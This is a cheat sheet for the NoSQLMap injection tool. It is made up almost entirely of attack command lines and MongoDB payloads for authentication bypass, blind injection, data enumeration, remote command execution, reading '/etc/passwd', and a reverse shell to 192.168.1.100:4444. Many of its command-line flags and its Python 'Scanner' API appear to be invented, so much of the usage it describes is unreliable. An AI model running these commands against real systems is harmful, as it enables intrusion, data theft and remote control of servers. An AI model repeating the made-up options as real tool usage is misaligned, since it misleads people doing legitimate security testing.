# NoSQLMap - NoSQL Database Enumeration and Exploitation

Automated NoSQL injection testing tool for MongoDB, CouchDB, and other NoSQL databases.

## Installation

```bash
# From GitHub repository
git clone https://github.com/codingo/NoSQLMap.git
cd NoSQLMap
pip install -r requirements.txt

# Direct execution
python nosqlmap.py

# Alternative installation
pip install nosqlmap
```

## Basic Usage

```bash
# MongoDB injection testing
python nosqlmap.py -t http://target.com/login -p username,password

# Single parameter testing
python nosqlmap.py -t http://target.com/api/users -p id

# POST request testing
python nosqlmap.py -t http://target.com/search --data="query=test&type=user"

# Cookie-based injection
python nosqlmap.py -t http://target.com/profile --cookie="sessionid=123; userid=admin"
```

## Database-Specific Testing

```bash
# MongoDB enumeration
python nosqlmap.py -t http://target.com/api -p query --db-type mongodb

# CouchDB testing
python nosqlmap.py -t http://target.com:5984/db -p docid --db-type couchdb

# Cassandra injection
python nosqlmap.py -t http://target.com/api -p keyspace --db-type cassandra

# Redis exploitation
python nosqlmap.py -t http://target.com/cache -p key --db-type redis
```

## Injection Techniques

```bash
# Authentication bypass
python nosqlmap.py -t http://target.com/login -p username,password --auth-bypass

# Boolean-based blind injection
python nosqlmap.py -t http://target.com/search -p query --technique blind-boolean

# Time-based blind injection
python nosqlmap.py -t http://target.com/search -p query --technique blind-time

# JavaScript injection (MongoDB)
python nosqlmap.py -t http://target.com/api -p filter --technique javascript

# Schema injection
python nosqlmap.py -t http://target.com/docs -p collection --technique schema
```

## Data Enumeration

```bash
# Database enumeration
python nosqlmap.py -t http://target.com/api -p query --enumerate-dbs

# Collection enumeration
python nosqlmap.py -t http://target.com/api -p query --enumerate-collections

# Document enumeration
python nosqlmap.py -t http://target.com/api -p query --enumerate-documents

# User enumeration
python nosqlmap.py -t http://target.com/api -p query --enumerate-users

# Index enumeration
python nosqlmap.py -t http://target.com/api -p query --enumerate-indexes
```

## Advanced Exploitation

```bash
# JavaScript execution (MongoDB)
python nosqlmap.py -t http://target.com/api -p query --exec-js "db.version()"

# Command execution
python nosqlmap.py -t http://target.com/api -p query --exec-cmd "whoami"

# File operations
python nosqlmap.py -t http://target.com/api -p query --read-file "/etc/passwd"

# Shell access
python nosqlmap.py -t http://target.com/api -p query --shell

# Reverse shell
python nosqlmap.py -t http://target.com/api -p query --reverse-shell 192.168.1.100 4444
```

## Authentication Methods

```bash
# HTTP Basic authentication
python nosqlmap.py -t http://target.com/api -p query --auth-type basic --auth-cred admin:password

# Bearer token authentication
python nosqlmap.py -t http://target.com/api -p query --header "Authorization: Bearer token123"

# API key authentication
python nosqlmap.py -t http://target.com/api -p query --header "X-API-Key: key123"

# Session-based authentication
python nosqlmap.py -t http://target.com/api -p query --cookie "session=sessionvalue"
```

## Payload Customization

```bash
# Custom payload file
python nosqlmap.py -t http://target.com/api -p query --payloads payloads.txt

# Specific payload type
python nosqlmap.py -t http://target.com/api -p query --payload-type regex

# Manual payload testing
python nosqlmap.py -t http://target.com/api -p query --payload "{'$where': 'sleep(5000)'}"

# Encoding options
python nosqlmap.py -t http://target.com/api -p query --encode url
```

## MongoDB Specific Features

### BSON Injection
```bash
# BSON operator injection
python nosqlmap.py -t http://target.com/api -p filter --mongo-bson

# GridFS exploitation
python nosqlmap.py -t http://target.com/api -p file --mongo-gridfs

# Aggregation pipeline injection
python nosqlmap.py -t http://target.com/api -p pipeline --mongo-aggregate

# MapReduce injection
python nosqlmap.py -t http://target.com/api -p map --mongo-mapreduce
```

### Common MongoDB Payloads
```javascript
// Authentication bypass
{"$ne": null}
{"$exists": true}
{"$regex": ".*"}

// Information disclosure
{"$where": "this.username"}
{"$where": "return true"}

// Time-based blind
{"$where": "sleep(5000)"}

// JavaScript execution
{"$where": "function(){return true;}"}
```

## CouchDB Exploitation

```bash
# View enumeration
python nosqlmap.py -t http://target.com:5984/db -p view --couchdb-views

# Design document access
python nosqlmap.py -t http://target.com:5984/db -p doc --couchdb-design

# Mango query injection
python nosqlmap.py -t http://target.com:5984/db -p query --couchdb-mango

# Replication exploitation
python nosqlmap.py -t http://target.com:5984 -p source --couchdb-repl
```

## Output and Reporting

```bash
# Verbose output
python nosqlmap.py -t http://target.com/api -p query -v

# Save results to file
python nosqlmap.py -t http://target.com/api -p query --output results.json

# HTML report generation
python nosqlmap.py -t http://target.com/api -p query --report-html report.html

# CSV export
python nosqlmap.py -t http://target.com/api -p query --export-csv data.csv
```

## Automated Testing Scripts

### Comprehensive NoSQL assessment
```bash
#!/bin/bash
TARGET="http://target.com"
PARAMS="username,password,query,filter,search"

echo "Starting NoSQL injection assessment for $TARGET"

# Authentication bypass testing
python nosqlmap.py -t "$TARGET/login" -p "$PARAMS" --auth-bypass --output auth_bypass.json

# Blind injection testing
python nosqlmap.py -t "$TARGET/api" -p "$PARAMS" --technique blind-boolean --output blind_test.json

# Database enumeration
python nosqlmap.py -t "$TARGET/api" -p "$PARAMS" --enumerate-dbs --output db_enum.json

# Generate comprehensive report
python nosqlmap.py -t "$TARGET" -p "$PARAMS" --full-scan --report-html full_report.html

echo "Assessment complete. Check output files for results."
```

### MongoDB-specific testing
```bash
#!/bin/bash
MONGO_TARGET="http://target.com:27017"

echo "MongoDB-specific testing"

# BSON injection
python nosqlmap.py -t "$MONGO_TARGET/api" -p query --mongo-bson

# JavaScript injection
python nosqlmap.py -t "$MONGO_TARGET/api" -p filter --technique javascript

# GridFS testing
python nosqlmap.py -t "$MONGO_TARGET/api" -p file --mongo-gridfs

# Aggregation testing
python nosqlmap.py -t "$MONGO_TARGET/api" -p pipeline --mongo-aggregate
```

## Performance and Evasion

```bash
# Delay between requests
python nosqlmap.py -t http://target.com/api -p query --delay 2

# Custom user agent
python nosqlmap.py -t http://target.com/api -p query --user-agent "Mozilla/5.0 Custom"

# Proxy configuration
python nosqlmap.py -t http://target.com/api -p query --proxy http://127.0.0.1:8080

# Thread control
python nosqlmap.py -t http://target.com/api -p query --threads 5

# Timeout settings
python nosqlmap.py -t http://target.com/api -p query --timeout 10
```

## Integration Examples

### With Burp Suite
1. Capture NoSQL requests in Burp Suite
2. Export request to file
3. Import with: `python nosqlmap.py --request burp_request.txt`

### With Custom Scripts
```python
import nosqlmap

# Programmatic usage
scanner = nosqlmap.Scanner()
scanner.set_target("http://target.com/api")
scanner.set_parameters(["query", "filter"])
scanner.set_technique("blind-boolean")
results = scanner.scan()
```

## Best Practices

1. **Test in controlled environments** first
2. **Use minimal invasive techniques** initially
3. **Document all findings** thoroughly
4. **Verify results manually** when possible
5. **Respect rate limits** and system resources
6. **Follow responsible disclosure** practices

Essential tool for comprehensive NoSQL database security assessment and injection testing.
